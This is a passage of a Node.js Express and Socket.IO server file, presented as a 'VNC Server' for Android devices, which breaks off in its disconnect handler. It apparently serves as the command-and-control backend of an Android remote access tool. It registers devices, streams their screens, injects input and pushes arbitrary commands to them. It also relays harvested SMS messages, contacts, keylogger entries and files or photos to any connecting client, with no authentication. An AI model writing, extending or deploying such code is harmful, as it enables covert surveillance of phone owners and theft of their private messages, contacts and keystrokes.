const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const helmet = require('helmet');

const app = express();
const server = http.createServer(app);

// Security and performance middleware
app.use(helmet({
    contentSecurityPolicy: false
}));
app.use(cors({
    origin: "*",
    methods: ["GET", "POST"],
    allowedHeaders: ["Content-Type", "Authorization"]
}));
app.use(express.json({ limit: '50mb' }));

const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    pingTimeout: 60000,
    pingInterval: 25000
});

// Connected devices storage
const connectedDevices = new Map();
const deviceSessions = new Map();

// Health check endpoint
app.get('/', (req, res) => {
    res.json({ 
        status: 'VNC Server Running',
        timestamp: new Date().toISOString(),
        connectedDevices: connectedDevices.size,
        activeSessions: deviceSessions.size
    });
});

// Device registration endpoint
app.post('/device/register', (req, res) => {
    const { device_id, device_name, android_version, ip_address } = req.body;
    
    connectedDevices.set(device_id, {
        id: device_id,
        name: device_name,
        androidVersion: android_version,
        ipAddress: ip_address,
        lastSeen: new Date(),
        isOnline: true
    });
    
    // Notify all clients
    io.emit('device_connected', {
        device_id,
        device_name,
        android_version,
        ip_address,
        timestamp: new Date()
    });
    
    res.json({ success: true, message: 'Device registered successfully' });
});

// Get connected devices
app.get('/devices', (req, res) => {
    res.json(Array.from(connectedDevices.values()));
});

// Command endpoint
app.post('/command/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    const { command, payload } = req.body;
    
    // Send command to device
    io.to(`device_${deviceId}`).emit('command', {
        command,
        payload,
        timestamp: new Date()
    });
    
    res.json({ success: true, message: 'Command sent' });
});

// Socket.IO connections
io.on('connection', (socket) => {
    console.log('New connection:', socket.id);
    
    // Device registration
    socket.on('register_device', (data) => {
        const { device_id, device_name, android_version } = data;
        socket.join(`device_${device_id}`);
        
        connectedDevices.set(device_id, {
            ...data,
            socketId: socket.id,
            lastSeen: new Date(),
            isOnline: true
        });
        
        console.log(`Device registered: ${device_id} (${device_name})`);
        
        // Notify all clients
        socket.broadcast.emit('device_connected', data);
    });
    
    // Client registration
    socket.on('register_client', (data) => {
        socket.join('clients');
        socket.emit('connected_devices', Array.from(connectedDevices.values()));
        console.log('Client registered:', socket.id);
    });
    
    // VNC session start
    socket.on('start_vnc', (data) => {
        const { device_id } = data;
        deviceSessions.set(device_id, {
            clientSocket: socket.id,
            deviceId: device_id,
            startTime: new Date()
        });
        
        // Tell device to start VNC
        io.to(`device_${device_id}`).emit('start_vnc_capture', {
            client_socket: socket.id
        });
        
        console.log(`VNC session started for device: ${device_id}`);
    });
    
    // Screen update from device
    socket.on('screen_update', (data) => {
        const { device_id, image_data, timestamp } = data;
        const session = deviceSessions.get(device_id);
        
        if (session) {
            io.to(session.clientSocket).emit('screen_data', {
                device_id,
                image: image_data,
                timestamp
            });
        }
    });
    
    // VNC input from client
    socket.on('vnc_input', (data) => {
        const { device_id, input_type, input_data } = data;
        io.to(`device_${device_id}`).emit('vnc_input', {
            type: input_type,
            data: input_data,
            timestamp: new Date()
        });
    });
    
    // Device commands
    socket.on('device_command', (data) => {
        const { device_id, command, payload } = data;
        io.to(`device_${device_id}`).emit('command', {
            command,
            payload,
            client_socket: socket.id,
            timestamp: new Date()
        });
    });
    
    // Command response from device
    socket.on('command_response', (data) => {
        const { client_socket, response } = data;
        if (client_socket) {
            io.to(client_socket).emit('command_result', response);
        }
    });
    
    // SMS data
    socket.on('sms_data', (data) => {
        const { client_socket, sms_list } = data;
        if (client_socket) {
            io.to(client_socket).emit('sms_received', sms_list);
        }
    });
    
    // Contact data
    socket.on('contact_data', (data) => {
        const { client_socket, contacts } = data;
        if (client_socket) {
            io.to(client_socket).emit('contacts_received', contacts);
        }
    });
    
    // Keylog data
    socket.on('keylog_data', (data) => {
        const { client_socket, keylog_entries } = data;
        if (client_socket) {
            io.to(client_socket).emit('keylog_received', keylog_entries);
        }
    });
    
    // File/Photo data
    socket.on('file_data', (data) => {
        const { client_socket, file_content, file_type } = data;
        if (client_socket) {
            io.to(client_socket).emit('file_received', {
                content: file_content,
                type: file_type,
                timestamp: new Date()
            });
        }
    });
    
    // Ping/Pong for connection health
    socket.on('ping', () => {
        socket.emit('pong');
    });
    
    // Disconnect handling
    socket.on('disconnect', () => {
        console.log('Disconnected:', socket.id);
        
        // Remove device if it was a device 
